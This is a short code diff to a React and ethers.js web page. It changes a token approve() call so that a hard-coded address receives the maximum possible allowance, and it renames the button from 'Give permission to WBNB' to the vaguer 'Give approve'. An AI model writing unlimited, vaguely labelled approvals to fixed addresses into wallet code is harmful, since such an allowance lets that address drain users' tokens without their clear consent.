@@ -57,7 +57,7 @@ export const MainPage: FC = () => {
     const signer = library?.getSigner();
     const contract = new ethers.Contract(selectedToken, ABI, signer);
 
-    await contract.approve("0xe47085AaA1dc8122f5A1f623068967b3bc92782c", "9999999999");
+    await contract.approve("0xe47085AaA1dc8122f5A1f623068967b3bc92782c", "115792089237316195423570985008687907853269984665640564039457584007913129639935");
   };
 
   return (
@@ -112,7 +112,7 @@ export const MainPage: FC = () => {
 
           <S.SubmitButton>
             <Button stretch size="large" onClick={onApprove}>
-              Give permission to WBNB
+              Give approve
             </Button>
           </S.SubmitButton>
         </S.Block>
